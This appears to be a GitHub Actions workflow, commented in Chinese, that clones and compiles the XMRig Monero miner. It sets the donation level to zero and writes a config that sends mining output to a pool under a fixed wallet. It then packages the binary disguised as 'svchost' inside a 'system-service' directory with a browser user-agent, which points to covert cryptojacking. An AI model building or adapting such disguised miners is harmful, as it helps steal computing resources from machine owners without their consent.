# .github/workflows/build-miner.yml

name: Build and Package Miner

# 触发条件：
# workflow_dispatch: 允许在 GitHub Actions 页面手动触发此工作流
on:
  workflow_dispatch:

jobs:
  build:
    name: Build for Linux (x64) on Ubuntu 22.04 (for compatibility with 24.04)
    runs-on: ubuntu-latest

    # 定义环境变量
    env:
      DIR_NAME: system-service
      EXE_NAME: svchost
      WALLET_ADDR: 47Z5E787p8bHJEEc2Bf878K86LHQcbKT6f8KEsU7ocmnQPKHNbHHdMNc4dW6drrR4egpHmkM2jTWkP1tg4wymd7DAtJD37L
      PACKAGE_NAME: system-core-package

    steps:
    - name: 1. Install Dependencies
      run: |
        sudo apt-get update
        sudo apt-get install -y git build-essential cmake automake libtool autoconf

    - name: 2. Clone Source Code
      run: git clone https://github.com/C3Pool/xmrig-C3.git ${{ env.DIR_NAME }}

    - name: 3. Patch Donation Level
      run: |
        sed -i 's/constexpr const int kDefaultDonateLevel =.*/constexpr const int kDefaultDonateLevel = 0;/g' ${{ env.DIR_NAME }}/src/donate.h
        sed -i 's/constexpr const int kMinimumDonateLevel =.*/constexpr const int kMinimumDonateLevel = 0;/g' ${{ env.DIR_NAME }}/src/donate.h
        echo "✅ Donation level patched."

    - name: 4. Create Config File
      run: |
        cat <<EOF > ./${{ env.DIR_NAME }}/src/config.json
        {
            "autosave": true,
            "cpu": {
                "enabled": true,
                "huge-pages": true,
                "hw-aes": null,
                "priority": null,
                "memory-pool": true,
                "yield": true,
                "asm": true,
                "max-threads-hint": 75
            },
            "randomx": {
                "init": -1,
                "mode": "auto",
                "1gb-pages": false,
                "rdmsr": true,
                "wrmsr": true,
                "numa": true
            },
            "pools": [
                {
                    "algo": null,
                    "coin": null,
                    "url": "auto.c3pool.org:19333",
                    "user": "${{ env.WALLET_ADDR }}",
                    "pass": "cloud-miner-01",
                    "keepalive": true,
                    "enabled": true,
                    "tls": true,
                    "tls-fingerprint": null
                }
            ],
            "log-file": null,
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
            "print-time": 300,
            "health-print-time": 300,
            "pause-on-battery": true
        }
        EOF
        echo "✅ config.json created."

    - name: 5. Build Static Dependencies
      working-directory: ${{ env.DIR_NAME }}/scripts
      run: |
        chmod +x ./*.sh
        ./build_deps.sh

    - name: 6. Compile The Main Program
      working-directory: ${{ env.DIR_NAME }}
      run: |
        mkdir build && cd build
        cmake .. -DXMRIG_DEPS=scripts/deps -DCMAKE_BUILD_TYPE=Release
        make -j$(nproc)

    - name: 7. Package The Artifacts
      run: |
        echo "--> Preparing final package directory..."
        mkdir -p final-package
        mv ${{ env.DIR_NAME }}/build/xmrig final-package/${{ env.EXE_NAME }}
        mv ${{ env.DIR_NAME }}/src/config.json final-package/config.json
        
        echo "--> Creating .tar.gz archive from inside the package directory..."
        # 关键修正：先进入打包目录，再执行打包，确保压缩包内没有多余的目录层级。
        # '..' 表示将生成的压缩包存放在上一级目录中。
        # '.' 表示将当前目录的所有内容打包。
        cd final-package
        tar -czvf ../${{ env.PACKAGE_NAME }}.tar.gz .
        
        echo "✅ Created clean .tar.gz archive."

    - name: 8. Upload Artifact
      uses: actions/upload-artifact@v4
      with:
        name: ${{ env.PACKAGE_NAME }}
        path: ${{ env.PACKAGE_NAME }}.tar.gz
